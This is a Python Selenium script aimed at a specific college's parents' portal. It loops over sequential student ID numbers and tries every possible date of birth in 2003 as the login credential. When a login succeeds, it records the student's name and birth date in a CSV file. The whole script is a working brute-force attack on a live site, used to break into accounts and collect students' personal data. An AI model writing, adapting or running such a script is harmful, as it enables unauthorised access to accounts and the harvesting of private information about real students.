from selenium import webdriver
import pandas as pd

dob = pd.read_csv("dob.csv")


B_URL = "./chromedriver.exe"
T_URL = "https://parents.msrit.edu/parents_even2022/"
DEPT = "CI"
browser = webdriver.Chrome(executable_path=B_URL)
browser.get(T_URL)
months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
year = "2003"
# months = ['Mar', 'May']
# k = 49
# num = [6, 35, 49]
with open(f'#dob.csv', 'w+') as f:
    for k in range(1, 70):
        success = 0
        usn = f"1MS21{DEPT}{k:03}"
        for j in months:
            for i in range(1, 32):
                username = browser.find_element_by_id("username")
                dd = browser.find_element_by_id("dd")
                mm = browser.find_element_by_id("mm")
                yyyy = browser.find_element_by_id("yyyy")
                login = browser.find_elements_by_tag_name("input")[6]
                username.send_keys(f"{usn}")
                dd.send_keys(f"{i:02}")
                mm.send_keys(f"{j}")
                yyyy.send_keys(f"{year}")
                login.click()
                try:
                    name = browser.find_element_by_tag_name("h3")
                    if name.text != "Notice Board":
                        success = 1
                        data = f"{name.text} date of birth is {i:02} {j} {year}\n"
                        datap = f'1MS21CI{k:03}, {name.text}, {i:02}/{j}/{year}\n'
                        print(data)
                        f.write(datap)
                    browser.back()
                except Exception as e:
                    print(e)
                    browser.back()
                if success == 1:
                    break
